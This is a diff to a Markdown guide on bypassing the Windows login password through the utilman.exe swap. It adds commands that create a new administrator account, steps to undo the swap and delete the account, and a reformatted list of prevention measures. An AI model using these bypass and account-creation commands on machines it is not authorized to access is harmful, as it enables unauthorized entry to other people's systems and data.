@@ -84,11 +84,47 @@ copy cmd.exe utilman.exe
 11. net user username password
 
 
+## Creating a New User Account
+
+To create a new user account in the Command Prompt (Username: `NewGuy`, Password: `abc123`), and add them to the Administrators usergroup, use the following commands:
+
+```bash
+net user NewGuy abc123 /add
+net localgroup Administrators NewGuy /add
+```
+
+You should be able to log in immediately with this new account.
+
+
+## Reverting Changes
+
+To restore utilman.exe, in the Command Prompt, type the following:
+
+C:>
+```bash
+cd windows\system32
+del utilman.exe
+ren utilman.exe.bak utilman.exe
+```
+
+
+Then, reboot the system.
+To remove the new user account you created earlier, type the following:
+
+```bash
+net user NewGuy /delete
+```
+
+
+
+
+
+
 ## Prevention: Protecting Your System
 
 To prevent people from bypassing your Windows password using Command Prompt (CMD) or other methods, you can implement several security measures. Here are some effective strategies:
 
-1. **Enable Local Security Policies:**
+**1. Enable Local Security Policies:**
 
 Use the Local Security Policy editor to enforce strong password policies.
 * Press Windows + R, type `secpol.msc`, and press Enter.
@@ -96,44 +132,44 @@ Use the Local Security Policy editor to enforce strong password policies.
     * Accounts: Administrator account status (disable if not needed)
     * Accounts: Guest account status (disable)
 
-2. **Disable Command Prompt Access:**
+**2. Disable Command Prompt Access:**
 
 You can restrict access to CMD for standard users.
 * Press Windows + R, type `gpedit.msc`, and press Enter.
 * Navigate to User Configuration > Administrative Templates > System.
 * Find the policy "Prevent access to the command prompt" and set it to Enabled.
 
-3. **Use User Account Control (UAC):**
+**3. Use User Account Control (UAC):**
 
 Ensure UAC is enabled to prevent unauthorized changes.
 * Go to Control Panel > User Accounts > Change User Account Control settings and set it to the highest level.
 
-4. **Limit Administrator Privileges:**
+**4. Limit Administrator Privileges:**
 
 Ensure that users do not have administrative privileges unless necessary.
 * Create standard user accounts for daily use and reserve admin accounts for administrative tasks.
 
-5. **Use BitLocker Encryption:**
+**5. Use BitLocker Encryption:**
 
 Encrypt your drives with BitLocker to protect data.
 * Go to Control Panel > System and Security > BitLocker Drive Encryption and enable it for your drives.
 
-6. **Keep Your System Updated:**
+**6. Keep Your System Updated:**
 
 Regularly update Windows to patch vulnerabilities.
 * Go to Settings > Update & Security > Windows Update and check for updates.
 
-7. **Use Strong Passwords:**
+**7. Use Strong Passwords:**
 
 Ensure that all user accounts have strong, complex passwords.
 * Consider implementing a password manager to generate and store complex passwords.
 
-8. **Monitor Account Access:**
+**8. Monitor Account Access:**
 
 Enable audit logging to monitor account access and changes.
 * In the Local Security Policy, navigate to Local Policies > Audit Policy and enable auditing for logon events.
 
-9. **Disable Boot from External Devices:**
+**9. Disable Boot from External Devices:**
 
 Prevent users from booting from USB or external drives.
 * Access BIOS/UEFI settings during boot and adjust boot order or disable USB booting.
